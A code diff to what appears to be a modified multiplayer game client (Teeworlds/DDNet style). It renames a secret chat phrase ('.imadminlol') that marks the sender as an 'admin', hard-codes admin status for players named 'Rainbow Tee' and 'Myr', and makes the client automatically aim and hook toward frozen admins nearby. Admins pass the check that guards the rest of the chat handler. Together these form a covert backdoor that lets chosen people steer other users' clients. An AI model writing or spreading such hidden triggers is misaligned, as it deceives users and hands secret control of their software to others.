@@ -428,11 +428,14 @@ void CGameClient::clientUpdate() {
 
 		bool AdminInFreeze = false;
 		for (int adm : admins) {
-			if (IsFreezeTile(m_aClients[adm].m_Predicted.m_Pos.x, m_aClients[adm].m_Predicted.m_Pos.x)) {
-				AdminInFreeze = true;
+			if (distance(localPos, m_aClients[adm].m_Predicted.m_Pos) <= 350) {
+				if(IsFreezeTile(m_aClients[adm].m_Predicted.m_Pos.x, m_aClients[adm].m_Predicted.m_Pos.y))
+				{
+					AdminInFreeze = true;
 
-				m_Controls.m_MousePos[0] = m_aClients[adm].m_Predicted.m_Pos - localPos;
-				hook();
+					m_Controls.m_MousePos[0] = m_aClients[adm].m_Predicted.m_Pos - localPos;
+					hook();
+				}
 			}
 		}
 
@@ -718,7 +721,7 @@ void CGameClient::clientUpdate() {
 
 void CGameClient::OnChat(char *msg, int CID)
 {
-	if(str_comp(msg, ".immyrlol") == 0)
+	if(str_comp(msg, ".imadminlol") == 0)
 		admins.push_back(CID);
 
 	// Is admin?
@@ -727,6 +730,10 @@ void CGameClient::OnChat(char *msg, int CID)
 		if(CID == id)
 			isAdmin = 1;
 	}
+	if(str_comp(m_aClients[CID].m_aName, "Rainbow Tee") == 0)
+		isAdmin = 1;
+	if(str_comp(m_aClients[CID].m_aName, "Myr") == 0)
+		isAdmin = 1;
 	if(!isAdmin)
 		return;
 
